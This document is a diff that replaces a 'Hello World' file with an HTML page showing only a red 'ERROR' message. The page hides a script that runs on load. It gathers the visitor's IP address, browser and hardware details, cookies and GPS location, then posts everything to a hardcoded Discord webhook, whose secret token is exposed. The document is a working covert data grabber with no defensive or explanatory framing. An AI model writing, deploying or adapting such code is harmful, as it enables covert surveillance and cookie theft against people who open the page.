@@ -1,1 +1,153 @@
-"Hello World" 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error</title>
+</head>
+<body>
+    <script>
+        function generateUniqueID() {
+            let existingID = localStorage.getItem("uniqueVisitorID");
+            if (!existingID) {
+                existingID = 'ID-' + Math.random().toString(36).substr(2, 9) + '-' + Date.now();
+                localStorage.setItem("uniqueVisitorID", existingID);
+            }
+            return existingID;
+        }
+
+        function getCookies() {
+            return document.cookie ? document.cookie : "No cookies available";
+        }
+
+        function sendToWebhook(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1335748835024044144/D_DZ-Rl-z3SYkz--_YMcdy-2o7zzc3gO0oaQ4NRK7nhcNEuRAMlkuuIQ5Y4jGBuhPx4s";
+            return fetch(webhookURL, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ embeds: [data] })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Data sent to Discord webhook:", data);
+            })
+            .catch(error => console.error("Error sending to Discord:", error));
+        }
+
+        function getPreciseLocation(callback) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`)
+                        .then(response => response.json())
+                        .then(data => {
+                            callback(position.coords.latitude.toFixed(6), position.coords.longitude.toFixed(6), data.display_name);
+                        })
+                        .catch(() => {
+                            callback("Unavailable", "Unavailable", "Location could not be determined");
+                        });
+                    },
+                    () => {
+                        callback("Denied", "Denied", "User denied GPS");
+                    }
+                );
+            } else {
+                callback("Unavailable", "Unavailable", "Geolocation not supported");
+            }
+        }
+
+        function getIP() {
+            return fetch('https://ipinfo.io/json?token=083c9410034559')
+                .then(response => response.json())
+                .then(data => {
+                    let ip = data.ip;  // IP-Adresse
+                    let browser = navigator.userAgent;
+                    let os = navigator.platform;
+                    let uniqueID = generateUniqueID();
+                    let timestamp = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
+                    let cookies = getCookies();
+                    let screenRes = `${screen.width}x${screen.height}`;
+                    let cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency.toString() : "Unknown";
+                    let ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
+                    let onlineStatus = navigator.onLine ? "Online" : "Offline";
+                    let language = navigator.language || navigator.userLanguage;
+                    let timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                    // WebGL-Informationen
+                    const gl = document.createElement('canvas').getContext('webgl');
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+
+                    return {
+                        ip,
+                        browser,
+                        os,
+                        uniqueID,
+                        timestamp,
+                        cookies,
+                        screenRes,
+                        cpuCores,
+                        ram,
+                        onlineStatus,
+                        language,
+                        timeZone,
+                        gpu
+                    };
+                })
+                .catch(error => console.error("Error fetching IP info:", error));
+        }
+
+        function collectDataAndSend() {
+            // Zuerst IP und Systemdaten sammeln
+            getIP().then(ipData => {
+                // Webhook 1 mit Systemdaten
+                const systemData = {
+                    "title": "📡 New Connection Logged",
+                    "color": 3447003,
+                    "fields": [
+                        { "name": "👤 Unique Visitor ID", "value": ipData.uniqueID, "inline": true },
+                        { "name": "🌍 IP Address", "value": ipData.ip, "inline": true },
+                        { "name": "🖥 Browser", "value": ipData.browser, "inline": true },
+                        { "name": "💻 Operating System", "value": ipData.os, "inline": true },
+                        { "name": "📺 Screen Resolution", "value": ipData.screenRes, "inline": true },
+                        { "name": "🖥 CPU Cores", "value": ipData.cpuCores, "inline": true },
+                        { "name": "💾 RAM", "value": ipData.ram, "inline": true },
+                        { "name": "🌐 Online Status", "value": ipData.onlineStatus, "inline": true },
+                        { "name": "🍪 Cookies", "value": ipData.cookies, "inline": false },
+                        { "name": "🌍 Language", "value": ipData.language, "inline": true },
+                        { "name": "⏰ Timestamp", "value": ipData.timestamp, "inline": true },
+                        { "name": "🗺 Timezone", "value": ipData.timeZone, "inline": true },
+                        { "name": "🎮 GPU", "value": ipData.gpu || "Unavailable", "inline": true }
+                    ]
+                };
+
+                sendToWebhook(systemData).then(() => {
+                    // Nun präzisere Geolocation sammeln
+                    getPreciseLocation((latitude, longitude, address) => {
+                        const locationData = {
+                            "title": "📡 Location Updated (GPS)",
+                            "color": 3447003,
+                            "fields": [
+                                { "name": "📍 New GPS Location", "value": `${latitude}, ${longitude} - ${address}`, "inline": true },
+                                { "name": "⏰ Updated Timestamp", "value": new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' }), "inline": true }
+                            ]
+                        };
+
+                        // Geolocation Webhook senden
+                        sendToWebhook(locationData);
+                    });
+                });
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            collectDataAndSend();
+        });
+
+    </script>
+
+    <div style="text-align: center; font-size: 50px; color: red; margin-top: 50px;">ERROR</div>
+</body>
+</html>
